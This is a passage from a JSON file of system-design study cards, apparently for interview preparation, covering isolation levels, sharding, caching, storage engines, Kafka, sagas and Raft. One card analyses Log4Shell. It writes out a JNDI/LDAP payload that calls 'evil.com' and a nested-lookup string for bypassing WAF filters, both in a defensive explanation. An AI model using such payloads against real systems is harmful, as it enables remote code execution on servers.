      "keyTakeaway": "Bearer token proves you have a secret; HMAC proves you know a secret without revealing it. Tokens for user apps; signatures for server-to-server and money-moving APIs."
    },
    {
      "id": "3.5",
      "tabTitle": "3.5 Log4Shell Zero-Day",
      "title": "3.5 Log4Shell: Anatomy of a Zero-Day",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Analysis of the CVE-2021-44228 vulnerability where string interpolation in logging allowed remote code execution via JNDI/LDAP.",
      "architecture": "THE EXPLOITATION CHAIN:\nAttacker sends payload: ${jndi:ldap://evil.com/a} in User-Agent header\n  │\n  ▼ 1. Application logs string via Log4j 2.x (message lookup evaluator)\n  ▼ 2. JNDI resolves LDAP URL (outbound socket connection to attacker server)\n  ▼ 3. Remote LDAP server returns serialized Java Class\n  ▼ 4. JVM deserializes and executes class → Remote Code Execution (RCE) as app user!",
      "tradeoffs": [
        "Untrusted Input to Interpreters (Logging was assumed to be a passive sink; it was actually an expression evaluator)",
        "Default-Deny Egress (Blocking arbitrary outbound internet connections from backend servers breaks the attack chain even on unpatched systems)",
        "WAF vs. Code Patching (WAF regex is easily bypassed via nested lookups `${${lower:j}ndi...}`; fix must be at runtime level)"
      ],
      "keyTakeaway": "Log4Shell is the canonical example of untrusted input reaching an interpreter. In design discussions, cite dependency inventory (SBOM), least privilege, and default-deny egress."
    }
  ],
  "9": [
    {
      "id": "4.1",
      "tabTitle": "4.1 Isolation & MVCC",
      "title": "4.1 Database Isolation Levels and MVCC",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Database isolation levels govern how concurrent transactions observe each other's writes, balancing transactional correctness against engine throughput.",
      "architecture": "MVCC VERSION CHAIN (Undo Log):\nRow: balance=100 (txn_id=200 committed)\nTxn A starts (Read View 201) → writes balance=200 (uncommitted)\nUndo log: [balance=200, txn_id=201] ──roll_pointer──► [balance=100, txn_id=200]\nTxn B starts (Read View 202) → reads balance=100 (skips uncommitted 201!)\nReaders NEVER block writers, writers NEVER block readers!",
      "tradeoffs": [
        "Isolation Levels & Anomalies: Read Uncommitted (dirty reads) → Read Committed (non-repeatable reads) → Repeatable Read (phantoms) → Serializable",
        "Write Skew: The anomaly MVCC snapshot isolation cannot prevent (e.g. two on-call doctors both checking 'at least 1 doctor on duty' and both going off-shift; fix via `SELECT FOR UPDATE` or Serializable SSI)",
        "Operational Cost of MVCC: Long-running read transactions pin undo logs, causing table bloat and transaction ID wraparound in PostgreSQL"
      ],
      "keyTakeaway": "Isolation level is a dial between anomalies and throughput, and MVCC is the trick that lets readers and writers not block each other. Know your engine's default (MySQL: Repeatable Read, Postgres: Read Committed)."
    },
    {
      "id": "4.2",
      "tabTitle": "4.2 Locking Models",
      "title": "4.2 Optimistic vs. Pessimistic Locking",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Two fundamental concurrency control strategies for preventing double-booking and race conditions when multiple clients mutate shared state.",
      "architecture": "OPTIMISTIC CONDITIONAL UPDATE:\nSELECT available_rooms, version FROM hotel_rooms WHERE id = 42; -- version=7\nUPDATE hotel_rooms\n   SET available_rooms = 0, version = 8\n WHERE id = 42 AND version = 7; -- Optimistic check\n-- rows_affected = 1 → SUCCESS | rows_affected = 0 → RETRY",
      "tradeoffs": [
        "Low Contention (Optimistic wins: zero lock acquisition overhead, fast) vs. High Contention (Pessimistic wins: eliminates $O(N^2)$ retry storms and livelocks)",
        "Pessimistic Locking (`SELECT FOR UPDATE`: serializes contention, fair FIFO, but risks deadlocks and holds DB connection open across network hops)",
        "Eliminating the Race Entirely: Atomic in-engine decrement (`UPDATE stock SET qty = qty - 1 WHERE qty > 0`) or single-owner queue partitioning"
      ],
      "keyTakeaway": "Optimistic locking is cheap when conflicts are rare and pathological when they are not. Say 'contention determines the choice', then show the atomic conditional update escape hatch."
    },
    {
      "id": "4.3",
      "tabTitle": "4.3 CAP & PACELC",
      "title": "4.3 CAP and PACELC",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "The theoretical boundaries of distributed data stores under network partitions and normal operational latency.",
      "architecture": "CAP & PACELC THEOREM FORMULATION:\nif (Partition P):\n    choose Availability (AP: accept writes, risk inconsistency)\n    or Consistency (CP: refuse writes, return error)\nelse (Normal State):\n    choose Latency (EL: fast local read, replication lag)\n    or Consistency (EC: wait for quorum ACK, high write latency)",
      "tradeoffs": [
        "'Pick 2 of 3' Myth (P is not optional on physical networks; fiber gets cut. The real choice is C vs. A ONLY while partitioned)",
        "ACID Consistency (C = invariants satisfied) vs. CAP Consistency (C = linearizability: every read returns latest write)",
        "Per-Data Flow Architecture: Real systems are mixed — CP for payment ledger and balance decrements, AP for product catalog and view counts"
      ],
      "keyTakeaway": "CAP only bites during a partition; PACELC describes the trade you make every millisecond. Answer per data flow: 'CP for the ledger, AP for the catalog.'"
    }
  ],
  "10": [
    {
      "id": "4.4",
      "tabTitle": "4.4 Replication Modes",
      "title": "4.4 The Latency / Consistency Trade-off in Replication",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "The fundamental trade-off between write acknowledgement latency and data durability across replicated database nodes.",
      "architecture": "THREE REPLICATION MODES:\n1. Synchronous: Client → Primary → Replica 1 & 2 persist → Primary ACKs (Zero data loss RPO=0, write latency = slowest replica)\n2. Asynchronous: Client → Primary persists → Primary ACKs immediately → Replicates in background (Fastest, data loss window on leader crash)\n3. Semi-Synchronous (The Pragmatic Default): ACK after $k$ of $n$ replicas persist (e.g. MySQL semi-sync, Kafka acks=all with min.insync.replicas=2)",
      "tradeoffs": [
        "RPO (Recovery Point Objective: max acceptable data loss) vs. RTO (Recovery Time Objective: failover duration)",
        "Availability penalty of sync replication (Shared fate: any slow or dead replica stalls all writes; quorum mitigates slowest node)",
        "Leader-based (Single write bottleneck, simple consistency) vs. Leaderless (Cassandra: writes anywhere, requires read repair and anti-entropy)"
      ],
      "keyTakeaway": "You cannot have a local-latency write and a globally consistent read of it. Default to semi-synchronous within a region plus asynchronous across regions."
    },
    {
      "id": "4.5",
      "tabTitle": "4.5 Read-Replica Pattern",
      "title": "4.5 The Read-Replica Pattern & Replication Lag",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Distributing read traffic across read-only replica nodes while routing writes to a single primary database, and mitigating replication lag anomalies.",
      "architecture": "READ-AFTER-WRITE ROUTING:\nOrder Service ──write──► Primary DB ──async replication (lag!)──► Replicas (R1, R2)\nClient reads: If read-sensitive / 'just wrote' → Route to Primary for N seconds\nIf read-tolerant (browse catalog) → Route to Replicas (offload 90% DB load)",
      "tradeoffs": [
        "Replication Lag Anomaly (Alice places order, refreshes page, replica is 200ms behind, order is missing!)",
        "Solutions: 1. Sticky session to primary for 5s after write; 2. GTID / LSN position check; 3. Return created entity directly in write response",
        "What Replicas DO NOT Solve: Replicas scale reads only! Every replica applies 100% of the write stream. Adding replicas never increases write capacity"
      ],
      "keyTakeaway": "Read replicas are the cheapest way to scale reads, and replication lag is the bill. Always pair the pattern with an explicit read-after-write routing story."
    },
    {
      "id": "4.8",
      "tabTitle": "4.8 Choosing DB",
      "title": "4.8 A Visual Guide to Choosing the Right Database",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Workload-driven database taxonomy matching storage architectures to access patterns, query shapes, and consistency requirements.",
      "architecture": "THE DECISION MATRIX:\n• Relational (Postgres, MySQL): Structured, ACID, ad-hoc joins, transactional orders & ledgers (The Default)\n• Key-Value (DynamoDB, Redis): Single-key get/put at massive scale, user profiles, sessions\n• Document (MongoDB): Semi-structured JSON, catalogs, rapidly evolving schemas\n• Wide-Column (Cassandra, ScyllaDB): Massive write rates, queries by partition + clustering key\n• Columnar OLAP (ClickHouse, BigQuery, Snowflake): Analytical aggregation over billions of rows\n• In-Memory (Redis, Memcached): Sub-millisecond volatile caching, rate limits, leaderboards",
      "tradeoffs": [
        "PostgreSQL as the Pragmatic Default (Handles relational, JSONB documents, full-text search, PostGIS geospatial, and range partitioning in one engine)",
        "Polyglot Persistence Tax (Each additional database engine introduces sync CDC pipelines, replication lag, and specialized operational on-call overhead)"
      ],
      "keyTakeaway": "Right database for the right workload: derive from access patterns, consistency needs, and scale. Defaulting to Postgres and cost-justifying each addition signals senior maturity."
    }
  ],
  "11": [
    {
      "id": "4.6",
      "tabTitle": "4.6 Sharding",
      "title": "4.6 Vertical and Horizontal Partitioning (Sharding)",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Partitioning datasets across multiple database nodes to scale beyond the write throughput and storage limits of a single machine.",
      "architecture": "SHARDING ROUTING SCHEMES:\n• Range-Based (e.g. user_id 1–1M to Shard 1, 1M–2M to Shard 2): Efficient range scans, but sequential keys create write hotspots on newest shard\n• Hash-Based (hash(user_id) mod N): Even distribution, but range queries become expensive scatter-gather across all shards; resharding rehashes ~80% keys",
      "tradeoffs": [
        "The Permanent Tax of Sharding: Cross-shard joins disappear; multi-shard transactions require 2PC or Sagas; secondary indexes require global lookup tables",
        "Shard Key Selection: High cardinality, even access distribution, matches dominant query pattern, and immutable",
        "Virtual Sharding (1,024 logical shards mapped to 8 physical nodes) enables online cluster rebalancing via metadata reassignment without resharding code"
      ],
      "keyTakeaway": "Shard only when the numbers force you to, and let the shard key be driven by the dominant query pattern. Name the permanent costs up front."
    },
    {
      "id": "4.7",
      "tabTitle": "4.7 Consistent Hashing",
      "title": "4.7 Consistent Hashing & Hash Rings",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "A distributed hashing technique where adding or removing a storage node remaps only $K/N$ keys instead of reshuffling nearly the entire keyspace.",
      "architecture": "CONSISTENT HASH RING:\nKeyspace: [0 to 2^32 - 1] mapped on a continuous circular ring\nNodes & Keys hashed onto ring; key belongs to first node clockwise.\nNode Addition: Adding Node D between B and C only remaps keys in that arc from C to D!\nVirtual Nodes (vnodes): Each physical server maps to 100–256 points on the ring → eliminates hot spots and distributes failure load evenly across peers.",
      "tradeoffs": [
        "Ring without vnodes (Uneven load distribution, node failure dumps 100% of load onto single clockwise neighbor causing cascading crash)",
        "Consistent Hashing DOES NOT solve Hot Keys (A viral celebrity tweet still maps to one node; solved orthogonally via caching or salting keys)"
      ],
      "keyTakeaway": "Consistent hashing + virtual nodes = elastic membership without mass data movement. Only K/N keys move. State plainly that it does nothing for hot keys."
    },
    {
      "id": "4.9",
      "tabTitle": "4.9 Storage Engines",
      "title": "4.9 Storage Engines: B-Tree vs. LSM-Tree",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Comparing in-place update storage engines (B-Trees) with append-only log-structured merge trees (LSM-Trees) on disk I/O characteristics.",
      "architecture": "DISK ORGANIZATION:\n• B-Tree (Postgres/InnoDB): In-place page update → RANDOM I/O + WAL. Read: O(log N) page walks. Write amplification from 16KB page rewrites.\n• LSM-Tree (RocksDB/Cassandra): Append-only write to MemTable in RAM + sequential WAL → flushed to immutable SSTables (L0, L1, L2). Background Compaction merges sorted runs and purges tombstones.",
      "tradeoffs": [
        "B-Tree (Predictable low-latency reads, stable performance, excellent range scans) vs. LSM-Tree (Order-of-magnitude higher write throughput, sequential I/O)",
        "LSM Compaction Pitfalls (Compaction competes with incoming traffic for disk I/O, causing write stalls and elevated p99 latency spikes)",
        "Deletes in LSM (Deletes are written as tombstones; read queries across heavily deleted tables scan millions of tombstones until compaction finishes)"
      ],
      "keyTakeaway": "Random writes are the enemy. B-Tree for balanced, read-oriented transactional workloads; LSM for ingest-heavy write workloads where you can absorb compaction."
    }
  ],
  "12": [
    {
      "id": "4.11",
      "tabTitle": "4.11 Metrics TSDB",
      "title": "4.11 Choosing a Database for Metrics (Time Series)",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Architecting high-frequency operational telemetry storage handling millions of append-only time-series data points per second.",
      "architecture": "TSDB ARCHITECTURAL ADVANTAGES:\n• Sequential Append-only by time: Zero in-place row mutations, high disk compression\n• Columnar Per-Series Blocks: Delta-of-delta timestamp compression + XOR float encoding (often <2 bytes per sample vs. 16+ bytes in relational tables)\n• Inverted Index on Labels: Rapid tag searching without creating relational index bloat\n• Built-in Rollups & Retention: Raw 10s for 7 days → 1min for 30 days → 1hr for 2 years",
      "tradeoffs": [
        "Why NOT MySQL/Postgres for metrics (Index maintenance under heavy writes collapses write throughput; rolling-window aggregations require expensive table scans)",
        "The High-Cardinality Trap (Adding `user_id` or `request_id` to metrics tags multiplies total series count exponentially, leading to Prometheus OOM crashes)"
      ],
      "keyTakeaway": "Metrics are write-heavy, append-only, time-ordered, and read in bursts. Purpose-built TSDBs win on compression and query semantics. Enforce strict label cardinality."
    },
    {
      "id": "4.12",
      "tabTitle": "4.12 Big Data Evolution",
      "title": "4.12 Big Data: The Papers and the Evolution",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "The 20-year historical trajectory of large-scale distributed data processing from Google's foundational 2003–2006 whitepapers to modern streaming.",
      "architecture": "LINEAGE AT A GLANCE:\nGFS (2003: Storage) + MapReduce (2004: Compute) + Bigtable (2006: Serving)\n  │\n  ├─► OLTP Branch: BigTable (no txn) → Megastore (entity groups) → Spanner (TrueTime, external consistency)\n  │\n  └─► OLAP Branch: MapReduce (batch) → Hive (SQL) → Dremel/BigQuery (interactive columnar query)\n      └─► Streaming: Lambda Architecture (Batch + Stream paths) → Kappa (Single streaming log) → Dataflow/Flink",
      "tradeoffs": [
        "Lambda Architecture (Dual code paths for batch and streaming: high maintenance and consistency synchronization burden) vs. Kappa Architecture (Single log replay)",
        "Event Time vs. Processing Time (Mobile events arrive late and out of order; streaming pipelines require watermarks to trigger time windows accurately)"
      ],
      "keyTakeaway": "Big data history is a story of giving up guarantees for scale, then buying them back: SQL on MapReduce, transactions on BigTable, single streaming path over dual paths."
    }
  ],
  "13": [
    {
      "id": "5.1",
      "tabTitle": "5.1 Cache Strategies",
      "title": "5.1 The Five Cache Strategies",
      "section": "Part 5 · Caching",
      "whatItIs": "Patterns governing how application services orchestrate data synchronization between volatile in-memory caches and persistent databases.",
      "architecture": "READ & WRITE PATTERNS:\n• Cache-Aside (Lazy Loading): App checks cache; on miss reads DB, populates cache with TTL. (Resilient to cache death; 3 hops on miss)\n• Read-Through: App queries cache proxy; cache transparently fills itself from DB.\n• Write-Through: App writes cache; cache synchronously writes DB. (Cache never stale; higher write latency)\n• Write-Around: App writes DB directly; skips cache. (Prevents polluting cache with write-once cold data)\n• Write-Back (Write-Behind): App writes cache; cache buffers and flushes async batch to DB. (Highest throughput; data loss risk on crash!)",
      "tradeoffs": [
        "Standard Production Pairing: Cache-Aside for reads + Write-Around (delete-on-write) for writes",
        "Invalidate vs. Update (Always prefer DELETE cache_key over SET cache_key on write to avoid race condition interleavings)",
        "Eviction Policies: LRU (least recently used, general default) vs. LFU (least frequently used, protects against one-off cache-flushing scans)"
      ],
      "keyTakeaway": "Cache aside for reads, delete-on-write for writes, TTL with jitter as a backstop. Deviate only when forced by durability (write-back) or strict freshness (write-through)."
    },
    {
      "id": "5.2",
      "tabTitle": "5.2 Cache Failure Modes",
      "title": "5.2 Cache Failure Modes: Penetration, Stampede, Avalanche",
      "section": "Part 5 · Caching",
      "whatItIs": "The three classic cascading collapse scenarios of caching systems and their production mitigation patterns.",
      "architecture": "THE THREE FAILURE SCENARIOS:\n1. Penetration: Non-existent keys query cache → miss → hit DB → DB miss. Attacker floods invalid IDs.\n   Fix: Bloom filter pre-check + negative caching with short TTL (30s).\n2. Stampede (Thundering Herd): 1 popular hot key expires; 10,000 concurrent readers all miss simultaneously and hammer DB.\n   Fix: Mutex lock (single-flight: only 1 caller fills DB; others wait or receive stale data).\n3. Avalanche: Millions of keys share identical TTL and expire at same second, or cache cluster crashes.\n   Fix: TTL Jitter (base ± random 20%) + cache warming + circuit breakers.",
      "tradeoffs": [
        "Negative Caching vs. Bloom Filters (Negative cache sentinels fill memory under randomized attacks; Bloom filters answer 'definitely absent' in zero DB hits)",
        "Logical Expiry (Store 'refresh_after' timestamp inside value; background worker refreshes while existing users receive stale value)"
      ],
      "keyTakeaway": "Name all three failure modes: penetration (negative cache + bloom filter), stampede (single-flight + serve stale), avalanche (TTL jitter + warmup + breakers)."
    },
    {
      "id": "5.3",
      "tabTitle": "5.3 Redis vs Memcached",
      "title": "5.3 Redis vs. Memcached",
      "section": "Part 5 · Caching",
      "whatItIs": "Architectural comparison between the two dominant in-memory data store technologies.",
      "architecture": "COMPARISON MATRIX:\n• Redis: Rich data structures (Strings, Hashes, Sets, Sorted Sets, Bitmaps, Streams), single-threaded execution loop (lock-free), persistence (RDB/AOF), built-in Sentinel/Cluster\n• Memcached: Pure key-value strings/blobs, multi-threaded architecture (scales linearly on massive multi-core instances), purely volatile (no persistence), slab memory allocator",
      "tradeoffs": [
        "Choose Redis when you need data structures (leaderboards via Sorted Sets, rate limiters via Lua, sets for online presence)",
        "Choose Memcached for pure, huge, volatile key-value caching where maximum memory efficiency and multi-core CPU throughput dominate",
        "Redis Single-Threading: Not a bottleneck because memory commands run in nanoseconds. Threaded I/O added in Redis 6 for network syscalls"
      ],
      "keyTakeaway": "Memcached is a cache; Redis is a data structure server that is often used as a cache. If your answer involves counters, sets, or queues, you have already chosen Redis."
    }
  ],
  "14": [
    {
      "id": "rev-2",
      "tabTitle": "Drills & Recall",
      "title": "Revision Day 2 · Database Internals, Sharding & Caching",
      "section": "Week 2 Review & Active Recall",
      "whatItIs": "Consolidation drills on Week 2 database and caching concepts: ACID isolation levels, sharding strategies, B-Trees vs LSM-Trees, and cache failure modes.",
      "architecture": "WEEK 2 RAPID AUDIT:\n✓ ANSI SQL Isolation Levels vs. Real-world anomalies (Write skew)\n✓ MVCC Read View and undo log rollback mechanics\n✓ Optimistic conditional update SQL vs. Pessimistic SELECT FOR UPDATE\n✓ CAP & PACELC theorem per-flow decision making\n✓ Sharding key criteria and virtual sharding (vnodes)\n✓ Cache failure taxonomy: Penetration, Stampede, Avalanche",
      "tradeoffs": [
        "Whiteboard Drill: Sizing a distributed Redis cluster for 500K ops/sec with consistent hashing",
        "Interview Drill: Explaining why write skew happens under Repeatable Read and how to resolve it"
      ],
      "keyTakeaway": "Senior interviewers test database edge cases: isolation anomalies, replication lag, and cache collapse. State failure modes before proposing solutions."
    },
    {
      "id": "rev-2-checklist",
      "tabTitle": "Week 2 Checklist",
      "title": "Week 2 Core Mastery Checklist",
      "section": "Week 2 Review & Active Recall",
      "whatItIs": "Self-assessment checklist to verify senior-level fluency on database architecture and storage engines.",
      "architecture": "CHECKLIST OF CORE CONCEPTS:\n[ ] Can you explain why read-replicas provide zero write-scaling capability?\n[ ] Can you write the exact conditional SQL statement for optimistic locking?\n[ ] Can you diagram how an LSM-Tree handles deletes via tombstones and compaction?\n[ ] Can you explain how single-flight mutex locking prevents a cache stampede?\n[ ] Can you explain why consistent hashing alone does NOT solve hot keys?",
      "tradeoffs": [
        "Relying on database defaults vs. Engine nuances (Postgres Read Committed vs. MySQL Repeatable Read)",
        "Premature sharding vs. Vertical optimization (Shrinking row widths to fit buffer pools)"
      ],
      "keyTakeaway": "Master the difference between detecting conflicts and eliminating them: atomic in-engine operations beat retry loops every time."
    }
  ],
  "15": [
    {
      "id": "6.1",
      "tabTitle": "6.1 Storage Tiers",
      "title": "6.1 Block vs. File vs. Object Storage",
      "section": "Part 6 · Storage Systems & Object Storage",
      "whatItIs": "The three primary storage abstraction layers in computing, their mutation characteristics, and workload profiles.",
      "architecture": "STORAGE CLASSIFICATIONS:\n• Block Storage (SAN / NVMe / EBS): Raw unformatted volume, fixed-size blocks (4KB). Mutated in-place. Single server ownership. Sub-ms latency. Ideal for databases.\n• File Storage (NAS / NFS / EFS): Hierarchical folder tree, POSIX metadata, file + byte ranges. Shared across many servers over network. Millisecond latency.\n• Object Storage (S3 / GCS): Flat bucket namespace, immutable key-blob + custom metadata. REST API (HTTP PUT/GET). Whole-object replacement. Tens of ms latency. Exabyte scale.",
      "tradeoffs": [
        "The Decision Rule: Ask who mutates it and how. In-place microsecond random I/O → Block. Shared POSIX files → File. Immutable media/backups → Object",
        "Common Interview Mistake: Storing image/video blobs inside relational databases (Bloats buffer pool and ruins performance; store blobs in S3 and URI pointer in DB)"
      ],
      "keyTakeaway": "Block = raw & exclusive; File = shared hierarchy; Object = flat, HTTP-addressable immutable blobs. Choose by mutation pattern and sharing model, not by capacity."
    },
    {
      "id": "6.2",
      "tabTitle": "6.2 Why SSDs Fast",
      "title": "6.2 Why SSDs Are Fast",
      "section": "Part 6 · Storage Systems & Object Storage",
      "whatItIs": "Internal hardware mechanics of NAND flash solid-state drives, parallel channels, and the Flash Translation Layer (FTL).",
      "architecture": "PARALLEL ARCHITECTURE:\nHost (PCIe/NVMe) ──► SSD Controller (Flash Controller + RAM cache + FTL mapping)\n                         │\n       ┌────────┬────────┴────────┬────────┐\n       ▼        ▼                 ▼        ▼\n   Channel 0 Channel 1         Channel 2 Channel 3 (Parallel NAND dies)\n• No moving mechanical arm (eliminates 10ms disk seek)\n• Parallel channels allow concurrent page reads/writes across multiple chips\n• FTL out-of-place writes: Flash must be ERASED in large blocks before writing pages!",
      "tradeoffs": [
        "Erase-before-write & Write Amplification: Modifying 4KB requires writing a fresh page; Garbage Collection relocates valid pages, increasing physical writes",
        "Sequential vs. Random I/O on SSD: Sequential access maximizes channel parallelism and minimizes write amplification (Why Kafka & LSM-Trees are flash-friendly!)"
      ],
      "keyTakeaway": "An SSD is fast because it is parallel and has no seek; it is complicated because flash must be erased in blocks. Sequential, append-only writes remain king."
    },
    {
      "id": "6.3",
      "tabTitle": "6.3 Erasure Coding",
      "title": "6.3 Erasure Coding vs. Replication",
      "section": "Part 6 · Storage Systems & Object Storage",
      "whatItIs": "Mathematical durability technique used in modern object storage (S3) that fragments data into chunks with parity blocks for fault tolerance.",
      "architecture": "REED-SOLOMON 4+2 CONFIGURATION:\nObject broken into 4 data chunks: [d1, d2, d3, d4]\nCompute 2 parities: p1 = f(d1..d4), p2 = g(d1..d4)\nSpread 6 chunks across 6 failure domains (different racks/AZs):\n[Node 1: d1] [Node 2: d2] [Node 3: d3] [Node 4: d4] [Node 5: p1] [Node 6: p2]\nIf ANY 2 nodes crash, solve 2 linear equations to achieve 100% exact recovery!",
      "tradeoffs": [
        "Storage Overhead: 4+2 Erasure Coding requires 50% extra space vs. 3-way replication which requires 200% overhead (Huge cost savings!)",
        "Durability: Backblaze calculation shows Erasure Coding achieves ~11 nines durability vs. ~6 nines for 3× replication",
        "The Penalty: Degraded read during failure requires fetching k chunks and decoding on CPU + network; bad for small objects (<1MB)"
      ],
      "keyTakeaway": "Erasure coding buys more durability for a quarter of replication's storage overhead, and pays for it in read complexity and repair cost. Quote: '50% vs 200% overhead, 11 nines vs 6.'"
    }
  ],
  "16": [
    {
      "id": "7.1",
      "tabTitle": "7.1 Delivery Semantics",
      "title": "7.1 Delivery Semantics: At-Most, At-Least, Exactly Once",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "Message delivery contract guarantees across distributed queues and stream processors, and how to achieve exactly-once processing.",
      "architecture": "WHERE GUARANTEES COME FROM (ACK TIMING):\n• At-Most Once: ACK sent BEFORE processing → Worker crashes → Message LOST.\n• At-Least Once: ACK sent AFTER processing → Worker crashes before ACK → Message REDELIVERED (Duplicates possible!).\n• Exactly-Once Effect = At-Least Once delivery + Idempotent consumer (dedupe table or transactional offset commit).",
      "tradeoffs": [
        "The Two Generals Impossibility: Exactly-once DELIVERY across an unreliable network is theoretically impossible; exactly-once PROCESSING is achievable via idempotency",
        "Idempotent Consumer SQL: Insert `(event_id)` into `processed_events` table within same local DB transaction that executes business update (`ON CONFLICT DO NOTHING`)",
        "Message Queues (RabbitMQ/SQS: task dispatch with competing consumers, per-message delete) vs. Streaming Logs (Kafka: append-only, replayable, multiple consumers)"
      ],
      "keyTakeaway": "Ack timing determines the guarantee. Default to at-least-once and put the burden on an idempotent consumer. Say: 'Exactly-once is achievable as an effect, not as a delivery.'"
    },
    {
      "id": "7.2",
      "tabTitle": "7.2 Why Kafka Fast",
      "title": "7.2 Why Kafka Is Fast",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "The architectural principles that allow Apache Kafka to achieve millions of messages per second with sub-millisecond latency on commodity hardware.",
      "architecture": "ZERO-COPY DATA PATH (sendfile):\nDisk ──► OS Page Cache ──sendfile() syscall──► Network Card (NIC) ──► Consumer\nEliminates copying through user-space memory and avoids 4 context switches!\nSequential Append-Only Log: Disk sequential throughput matches RAM speeds (~600 MB/s); OS readahead prefetches pages into kernel buffer.",
      "tradeoffs": [
        "OS Page Cache IS the Cache: Kafka keeps no in-process JVM message cache, eliminating GC pauses; broker restarts do not lose the warm cache",
        "Batching & Compression: Producers batch messages (`linger.ms`); broker transmits compressed batches without decompression",
        "When Zero-Copy Breaks: Enabling TLS encryption forces Kafka to copy bytes into user space for CPU encryption, raising CPU load"
      ],
      "keyTakeaway": "Kafka is fast because it only appends (sequential I/O), never copies through user space (zero copy), batches aggressively, and lets the OS page cache do the caching."
    },
    {
      "id": "7.4",
      "tabTitle": "7.4 2PC vs. Saga",
      "title": "7.4 Distributed Transactions: 2PC vs. Saga",
      "section": "Part 7 · Messaging & Streaming",
      "whatItIs": "Techniques for maintaining consistency across independent microservices and databases without a single shared transaction coordinator.",
      "architecture": "2PC VS SAGA:\n• 2-Phase Commit (2PC): Phase 1 Prepare → Phase 2 Commit. Synchronous blocking locks held across network hops; coordinator crash leaves participants blocked ('in doubt').\n• Saga Pattern: Sequence of local transactions where each step commits immediately. If Step 3 fails, compensating transactions run in reverse (Refund payment, Cancel reservation).\n• Transactional Outbox: Write business entity + event to local DB transaction, then relay to Kafka at-least-once.",
      "tradeoffs": [
        "Atomicity vs. Availability (2PC gives ACID atomicity but destroys availability across microservices; Sagas give eventual consistency with high availability)",
        "Intermediate States in Sagas (Intermediate states are visible to users; require semantic locks: e.g. marking order as `PENDING`)",
        "Irreversible Steps (Sending an email or charging a card cannot be rolled back; order saga steps so irreversible actions happen LAST)"
      ],
      "keyTakeaway": "2PC buys atomicity with availability; sagas buy availability with isolation. Across microservices, choose sagas: orchestrated, idempotent, with a transactional outbox."
    }
  ],
  "17": [
    {
      "id": "10.1",
      "tabTitle": "10.1 Consensus & Raft",
      "title": "10.1 Consensus and Coordination (Raft)",
      "section": "Part 10 · Distributed Systems Fundamentals",
      "whatItIs": "Protocols allowing a cluster of independent nodes to agree on a single sequence of state machine transitions despite network delays and machine crashes.",
      "architecture": "RAFT CONSENSUS LIFECYCLE:\nFollower ──(election timeout 150-300ms)──► Candidate ──votes──► Leader (Term N+1)\nClient ──Write──► Leader ──replicates──► Follower 1 & 2\nOnce replicated to MAJORITY (Quorum = floor(N/2)+1) → Entry Committed → Applied to State Machine → ACK Client.\nFencing Tokens: Monotonically increasing numbers sent with leases so storage can reject stale zombie leaders!",
      "tradeoffs": [
        "Quorum Arithmetic: 3 nodes tolerate 1 failure (quorum=2); 4 nodes tolerate 1 failure (quorum=3; slower writes for zero gain!); Always use ODD cluster sizes (3, 5)",
        "Split-Brain Prevention: A minority partition cannot achieve quorum votes, preventing split-brain write corruption",
        "Coordination Stores (etcd, ZooKeeper): Coordination stores hold megabytes, not gigabytes! Storing application data in etcd starves the control plane"
      ],
      "keyTakeaway": "Consensus buys one unambiguous decision-maker at the cost of a quorum round trip. Use odd cluster sizes, spread members across AZs, and remember locks require fencing tokens."
    },
    {
      "id": "10.2",
      "tabTitle": "10.2 Distributed Time",
      "title": "10.2 Distributed Time and Ordering",
      "section": "Part 10 · Distributed Systems Fundamentals",
      "whatItIs": "Mechanisms for determining causality and order of events in distributed environments where physical wall-clocks drift and cannot be trusted.",
      "architecture": "ORDERING MECHANISMS COMPARISON:\n• Wall-Clock (NTP): Clocks drift, leap seconds, VM pauses. Last-Write-Wins (LWW) silently discards newer writes!\n• Lamport Timestamps: Counter per node; guarantees total ordering but cannot detect whether two events are concurrent\n• Vector Clocks: Vector of counters per node; detects true concurrency: {A:1, B:0} vs {A:0, B:1} are incomparable → concurrent siblings surfaced for application merge\n• TrueTime (Google Spanner): GPS + Atomic clocks in datacenters expose bounded uncertainty interval [earliest, latest]; commit-wait guarantees external consistency.",
      "tradeoffs": [
        "Never order events or expire leases using unsynchronized wall-clock timestamps",
        "Vector Clock Overhead: Metadata grows with number of writers; requires pruning and application domain merge functions"
      ],
      "keyTakeaway": "Wall-clock time is not an ordering mechanism. Prefer designs that need no global order (commutative operations). When order is required, name the mechanism and its cost."
    },
    {
      "id": "10.4",
      "tabTitle": "10.4 Failure Detection",
      "title": "10.4 Failure Detection & Grey Failures",
      "section": "Part 10 · Distributed Systems Fundamentals",
      "whatItIs": "Algorithms used by clusters to detect dead nodes, trigger leader elections, and handle partial degraded node failures.",
      "architecture": "DETECTION MECHANISMS:\n• Fixed Heartbeat: Miss $k$ heartbeats → declare dead (Simple, but vulnerable to GC pauses)\n• Phi-Accrual (Cassandra/Akka): Models historical heartbeat arrival distribution; outputs suspicion level $\\phi$ rather than binary dead/alive\n• SWIM Gossip (Consul/HashiCorp): Random peer probes; if no reply, asks other nodes to probe indirectly before declaring dead (filters out single bad links, scales to thousands of nodes)",
      "tradeoffs": [
        "The Impossibility Result: On an asynchronous network, you cannot distinguish a crashed node from a slow node or a partition. Every detector is a guess with a bias",
        "Grey Failure: The hardest real-world bug. Node is not dead, but sick (answers health check 200 OK while serving 40% errors). Requires outlier ejection comparing peer error rates",
        "Correlated False Positives: Fleet-wide GC or network switch blip makes 50% of nodes look dead; automated recovery must have a circuit breaker to prevent mass eviction"
      ],
      "keyTakeaway": "You cannot tell dead from slow: pick which mistake you can afford. Aggressive detection needs fencing; patient detection costs availability. Use outlier ejection for sick nodes."
    }
  ],
  "18": [
    {
      "id": "11.3",
      "tabTitle": "11.3 Service Mesh",
      "title": "11.3 Service Mesh and the Sidecar Model",
